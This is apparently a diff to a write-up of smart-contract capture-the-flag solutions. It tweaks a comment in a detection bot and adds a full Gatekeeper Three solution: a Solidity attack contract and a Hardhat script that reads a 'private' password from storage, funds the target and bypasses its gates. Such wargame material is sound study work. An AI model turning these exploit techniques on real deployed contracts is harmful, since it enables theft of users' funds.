@@ -1111,7 +1111,7 @@ contract DetectionBot {
 
   function handleTransaction(address user, bytes calldata msgData) external {
     // Only DoubleEntryPoint.delegateTransfer has the fortaNotify modifier,
-    // ie no need to check the function signature here
+    // ie no need to check the 4-byte function selector here
     (,, address origSender) = abi.decode(msgData[4:], (address, uint256, address));
     if (origSender == cryptoVault)
       IForta(msg.sender).raiseAlert(user);
@@ -1201,6 +1201,65 @@ async function main() {
 
   console.log(`Coin.balances(Wallet) = ${await coin.balances(await wallet.getAddress())}`);
   console.log(`Coin.balances(GoodSamaritanAttack) = ${await coin.balances(await goodSamaritanAttack.getAddress())}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 28 Gatekeeper Three
+
+```sol
+pragma solidity ^0.8.0;
+
+import "./GatekeeperThree.sol";
+
+contract GatekeeperThreeAttack {
+  function attack(GatekeeperThree target) external {
+    target.construct0r();
+    target.enter();
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const gatekeeperThree = (await hre.ethers.getContractFactory("GatekeeperThree")).attach("<target contract address>");
+  console.log(`GatekeeperThree entrant = ${await gatekeeperThree.entrant()}`);
+
+  const [ player ] = await hre.ethers.getSigners();
+  console.log(`Player address: ${player.address}`);
+
+  let trickAddress = await gatekeeperThree.trick();
+  if (trickAddress == 0n) { // Uninitialized
+    console.log("Calling GatekeeperThree.createTrick()");
+    (await gatekeeperThree.createTrick()).wait();
+    trickAddress = await gatekeeperThree.trick();
+  }
+  console.log(`GatekeeperThree trick address: ${trickAddress}`);
+
+  const password = await hre.ethers.provider.getStorage(trickAddress, 2);
+  console.log(`SimpleTrick password = ${password}`);
+  console.log(`GatekeeperThree allowEntrance = ${await gatekeeperThree.allowEntrance()}`);
+  (await gatekeeperThree.getAllowance(password)).wait();
+  console.log(`GatekeeperThree allowEntrance = ${await gatekeeperThree.allowEntrance()}`);
+
+  const balance = await hre.ethers.provider.getBalance(gatekeeperThree);
+  if (balance < 1000000000000001n) {
+    console.log(`Sending ${1000000000000001n-balance} wei to GatekeeperThree`);
+    await player.sendTransaction({from:player.address, to:await gatekeeperThree.getAddress(), value:1000000000000001n-balance});
+  }
+
+  const gatekeeperThreeAttack = await hre.ethers.deployContract("GatekeeperThreeAttack");
+  await gatekeeperThreeAttack.waitForDeployment();
+  (await gatekeeperThreeAttack.attack(await gatekeeperThree.getAddress())).wait();
+
+  console.log("Attack complete");
+  console.log(`GatekeeperThree entrant = ${await gatekeeperThree.entrant()}`);
 }
 
 main().catch((error) => {
